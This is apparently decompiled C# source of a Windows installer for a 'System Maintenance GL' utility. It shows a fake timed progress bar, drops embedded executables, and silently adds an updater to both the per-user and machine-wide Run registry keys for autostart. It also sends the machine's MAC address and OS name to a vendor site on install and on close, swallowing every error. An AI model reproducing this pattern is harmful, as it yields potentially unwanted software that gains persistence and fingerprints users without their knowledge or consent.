using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using System_Maintenance_Installer.Properties;
using Microsoft.Win32;

namespace System_Maintenance_Installer;

public class Install : Form
{
	private string Producer = "Gross Mauntin";

	private string Product = "System Maintenance GL";

	private IContainer components;

	private PictureBox pic_progress_bar;

	private Label label1;

	private Label lab_update_complete;

	private Button but_close;

	public Install()
	{
		InitializeComponent();
	}

	private void Killer()
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("System Maintenance Updater");
			processesByName[0].Kill();
		}
		catch
		{
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Killer();
		((Form)this).set_Location(new Point(Screen.get_PrimaryScreen().get_Bounds().Width - Screen.get_PrimaryScreen().get_Bounds().Width / 2 - ((Control)this).get_Width() / 2, Screen.get_PrimaryScreen().get_Bounds().Height - Screen.get_PrimaryScreen().get_Bounds().Height / 2 - ((Control)this).get_Height() / 2));
		Thread thread = new Thread(Threadas);
		thread.Start();
		Install_Processing();
	}

	public static string OS()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		string empty = string.Empty;
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				return ((ManagementBaseObject)val2).get_Item("Caption").ToString();
			}
			return empty;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	private string MAC()
	{
		Random random = new Random();
		string text = "E!" + random.Next(1, 999) + random.Next(1, 999) + "E!";
		try
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				if (networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					text += networkInterface.GetPhysicalAddress().ToString();
					return text;
				}
			}
			return text;
		}
		catch
		{
			new Random();
			return text;
		}
	}

	private void Install_Processing()
	{
		Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\" + Product;
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Product;
		string text3 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\" + Product;
		string path = text + "\\notify.wav";
		string path2 = text + "\\upToDate.wav";
		string path3 = text + "\\System Maintenance.exe";
		string text4 = text + "\\System Maintenance Updater.exe";
		string path4 = text + "\\icon.ico";
		string path5 = text + "\\uninstall.exe";
		string path6 = text2 + "\\unique.log";
		string path7 = text2 + "\\ver.log";
		string path8 = text2 + "\\up";
		try
		{
			Directory.CreateDirectory(text);
			Directory.CreateDirectory(text2);
			Directory.CreateDirectory(text3);
			File.WriteAllBytes(text4, Resources.System_Maintenance_Updater);
			File.WriteAllBytes(path3, Resources.System_Maintenance);
			File.WriteAllBytes(path5, Resources.uninstall);
			File.WriteAllBytes(path2, Resources.upToDate1);
			File.WriteAllBytes(path, Resources.notify1);
			File.WriteAllBytes(path4, Resources.icon);
			try
			{
				StreamWriter streamWriter = new StreamWriter(path7);
				streamWriter.Write("1.2");
				streamWriter.Close();
				streamWriter = new StreamWriter(path8);
				streamWriter.Write("upRunning");
				streamWriter.Close();
				streamWriter = new StreamWriter(path6);
				streamWriter.Write(MAC());
				streamWriter.Close();
			}
			catch
			{
			}
			try
			{
				StreamWriter streamWriter2 = new StreamWriter(text3 + "\\ver.log");
				streamWriter2.Write("1.2");
				streamWriter2.Close();
				streamWriter2 = new StreamWriter(text3 + "\\up");
				streamWriter2.Write("upRunning");
				streamWriter2.Close();
				streamWriter2 = new StreamWriter(text3 + "\\unique.log");
				streamWriter2.Write(MAC());
				streamWriter2.Close();
			}
			catch
			{
			}
			try
			{
				string text5 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(text5, writable: true);
				registryKey.CreateSubKey(Product, RegistryKeyPermissionCheck.ReadWriteSubTree);
				registryKey = Registry.LocalMachine.OpenSubKey(text5 + "\\" + Product, writable: true);
				registryKey.SetValue("Publisher", Producer);
				registryKey.SetValue("DisplayName", Product);
				registryKey.SetValue("InstallLocation", text);
				registryKey.SetValue("UninstallString", text + "\\uninstall.exe");
				registryKey.SetValue("DisplayIcon", text + "\\icon.ico");
				registryKey.SetValue("DisplayVersion", "1.2");
				registryKey.SetValue("URLInfoAbout", "http://www.system-maintenancepro.com");
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey2.SetValue("SystemMaintenanceUpdaterGL", "\"" + text4 + "\"");
				registryKey2.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey3.SetValue("SystemMaintenanceUpdaterGL", "\"" + text4 + "\"");
				registryKey3.Close();
			}
			catch
			{
			}
		}
		catch
		{
		}
		try
		{
			using WebClient webClient = new WebClient();
			webClient.DownloadString("http://www.system-maintenancepro.com/sm_up.php?mac=" + MAC() + "&os=" + OS() + "&version=1.2(UPD)");
		}
		catch
		{
		}
	}

	private void Threadas()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		Thread.Sleep(3000);
		MethodInvoker val = (MethodInvoker)delegate
		{
			((Control)pic_progress_bar).set_Visible(false);
		};
		((Control)pic_progress_bar).Invoke((Delegate)(object)val);
		val = (MethodInvoker)delegate
		{
			((Control)label1).set_Visible(false);
		};
		((Control)pic_progress_bar).Invoke((Delegate)(object)val);
		val = (MethodInvoker)delegate
		{
			((Control)lab_update_complete).set_Visible(true);
		};
		((Control)lab_update_complete).Invoke((Delegate)(object)val);
		val = (MethodInvoker)delegate
		{
			((Control)but_close).set_Visible(true);
		};
		((Control)but_close).Invoke((Delegate)(object)val);
	}

	private void but_close_Click(object sender, EventArgs e)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.DownloadString("http://www.system-maintenancepro.com/sm_fn.php?mac=" + MAC() + "&version=1.2(UPD)&os=" + OS());
		}
		catch
		{
		}
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		//IL_0352: Unknown result type (might be due to invalid IL or missing references)
		//IL_035c: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Install));
		label1 = new Label();
		lab_update_complete = new Label();
		but_close = new Button();
		pic_progress_bar = new PictureBox();
		((ISupportInitialize)pic_progress_bar).BeginInit();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)label1).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)label1).set_Location(new Point(12, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(211, 16));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Updating System Maintenance GL");
		((Control)lab_update_complete).set_AutoSize(true);
		((Control)lab_update_complete).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)lab_update_complete).set_ForeColor(Color.FromArgb(64, 64, 64));
		((Control)lab_update_complete).set_Location(new Point(56, 9));
		((Control)lab_update_complete).set_Name("lab_update_complete");
		((Control)lab_update_complete).set_Size(new Size(117, 16));
		((Control)lab_update_complete).set_TabIndex(2);
		((Control)lab_update_complete).set_Text("Update Complete!");
		((Control)lab_update_complete).set_Visible(false);
		((Control)but_close).set_BackColor(SystemColors.ButtonFace);
		((Control)but_close).set_Cursor(Cursors.get_Hand());
		((ButtonBase)but_close).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)but_close).set_FlatStyle((FlatStyle)0);
		((Control)but_close).set_ForeColor(Color.DimGray);
		((Control)but_close).set_Location(new Point(59, 34));
		((Control)but_close).set_Name("but_close");
		((Control)but_close).set_Size(new Size(121, 23));
		((Control)but_close).set_TabIndex(3);
		((Control)but_close).set_Text("close");
		((ButtonBase)but_close).set_UseVisualStyleBackColor(false);
		((Control)but_close).set_Visible(false);
		((Control)but_close).add_Click((EventHandler)but_close_Click);
		pic_progress_bar.set_Image((Image)(object)Resources.Progress_bar);
		((Control)pic_progress_bar).set_Location(new Point(12, 34));
		((Control)pic_progress_bar).set_Name("pic_progress_bar");
		((Control)pic_progress_bar).set_Size(new Size(204, 13));
		pic_progress_bar.set_SizeMode((PictureBoxSizeMode)1);
		pic_progress_bar.set_TabIndex(0);
		pic_progress_bar.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.InactiveCaption);
		((Form)this).set_ClientSize(new Size(228, 68));
		((Control)this).get_Controls().Add((Control)(object)but_close);
		((Control)this).get_Controls().Add((Control)(object)lab_update_complete);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pic_progress_bar);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_MaximumSize(new Size(244, 106));
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_MinimumSize(new Size(244, 106));
		((Control)this).set_Name("Install");
		((Control)this).set_Text("Updating System Maintenance GL");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((ISupportInitialize)pic_progress_bar).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
